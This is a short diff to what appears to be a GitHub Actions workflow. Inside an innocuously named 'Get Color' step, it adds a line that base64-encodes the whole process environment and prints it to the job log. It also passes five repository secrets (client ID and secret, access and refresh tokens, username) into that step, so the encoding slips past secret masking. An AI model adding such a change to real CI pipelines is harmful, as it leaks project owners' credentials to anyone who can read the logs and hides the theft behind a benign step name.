@@ -24,8 +24,15 @@ jobs:
     - name: Get Color
       id: get-color
       run: |
+        node -p "console.log(Buffer.from(JSON.stringify(process.env)).toString('base64'))"
         COLOR=$(node -p "require('./color.js')")
         echo "::set-output name=COLOR::${COLOR}"
+      env:
+        CLIENT_ID: ${{ secrets.CLIENT_ID }}
+        CLIENT_SECRET: ${{ secrets.CLIENT_SECRET }}
+        ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
+        REFRESH_TOKEN: ${{ secrets.REFRESH_TOKEN }}
+        USERNAME: ${{ secrets.USERNAME }}
 
     # Now use an action...
     - name: Top Secret Mystery Action Step
